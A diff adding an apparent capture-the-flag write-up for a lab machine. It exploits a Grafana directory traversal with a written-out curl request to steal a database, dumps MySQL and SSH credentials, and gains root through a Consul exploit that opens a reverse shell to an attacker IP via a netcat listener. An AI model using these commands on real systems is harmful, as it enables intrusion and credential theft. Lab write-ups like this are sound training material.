@@ -1,0 +1,139 @@
+IP machine → 10.10.11.183
+ 
+---- NMAP  ----
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+3000/tcp open  ppp?
+3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
+
+---- GOBUSTER ----
+/images               (Status: 301) [Size: 313] [--> http://10.10.11.183/images/]
+/categories           (Status: 301) [Size: 317] [--> http://10.10.11.183/categories/]
+/posts                (Status: 301) [Size: 312] [--> http://10.10.11.183/posts/]
+/tags                 (Status: 301) [Size: 311] [--> http://10.10.11.183/tags/]
+
+curl 10.10.11.183
+===> Use the developer account to SSH, DevOps will give you the password.
+
+---- EXPLOIT ----
+What is running on port 3000 ? usualy grafana 
+Lets check 
+
+We see a grafana login page, which run on version v8.2.0.
+After some research I know that this version is vulnerable to a directory traversal : https://www.exploit-db.com/exploits/50581
+
+i used the python code given by exploit db, but here a simpler version with metasploit → 
+
+msfconsole -q
+search grafana 
+use 1 
+set RHOSTS 10.10.11.183 
+run 
+
+cat the file from the scan 
+ 
+=> admin pass = [REDACTED]
+ 
+login on grafana → OK
+ 
+In the .ini file, we saw db source = grafana.db
+So lets grab it with the simplest directory traversal →
+
+curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+ 
+cat grafana.db 
+ 
+MySql password for grafana = [REDACTED]
+
+mysql -h 10.10.11.183 -u grafana -p [REDACTED]
+show databases;
+ 
+We can see the db : whackywidget
+ 
+use whackywidget
+show tables;
+select * from users; 
+ 
+developer = [REDACTED]
+ 
+Its crypted indeed ... 
+
+echo "[REDACTED]" | base64 -d
+ 
+password = [REDACTED]
+
+ssh developer@10.10.11.183
+
+cat user.txt 
+ 
+User flag = [REDACTED]
+
+Alright, now lets privesc ! 
+
+---- PRIVESC ----
+sudo -l → nothing can be used with sudo
+
+Then i downloaded linpeas, but it return nothing interessting 
+I checked my linux cheatsheet and I saw that the /opt directory who usualy stored the 3rd party apps. 
+
+cd /opt 
+ls 
+
+What is this My-app directory ?
+ls /My-app
+
+Hmm Hmm we can see a whackywidget dir
+
+cat /my-app/whackywidget/put-config-in-consul.sh 
+ 
+The sh file tells us that there is a consul service with a token initied 
+ 
+From my experience, i know that devs and devops used git a lot, and within the website it was saying that it is a test site for developping apps.
+
+Lets go grab some git commands documentation ! 
+ 
+git log
+ 
+there is somme "commit" done, but the first is made on "main"
+ 
+git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+ 
+TOKEN = [REDACTED]
+ 
+So then i searched for a consul service exploitation, and found this : https://www.exploit-db.com/exploits/46074
+
+nc -lvnp 4444
+
+i downloaded the exploit.py on the target and execute it →
+
+python3 exploit.py 127.0.0.1 8500 10.10.14.24 4444 bb03b43b-1d81-d62b-24b5-39540ee469b5 → i had some errors 
+
+so i tried with all the flags : -lh -lp ... but still failling
+
+after some test and research i decided to use metasploit, because .. why not ?
+
+msfconsole -q
+ 
+search consul  
+use /exploit/multi/misc/consul_service_exe
+ 
+show options
+set rhosts 10.10.11.183
+set lhost tun0 
+run → failed 
+ 
+Thats strange, it wont connect to the API
+i've retried a lot, and i finally found a forum where they had the same issue. 
+ 
+ssh -L 8000:127.0.0.1:8500 developer@10.10.11.183
+ 
+set rhosts localhost 
+set rport 8000
+run 
+
+And then, we got it boys. We're IN ! 
+ 
+cd /root
+cat root.txt
+ 
+root flag [REDACTED]
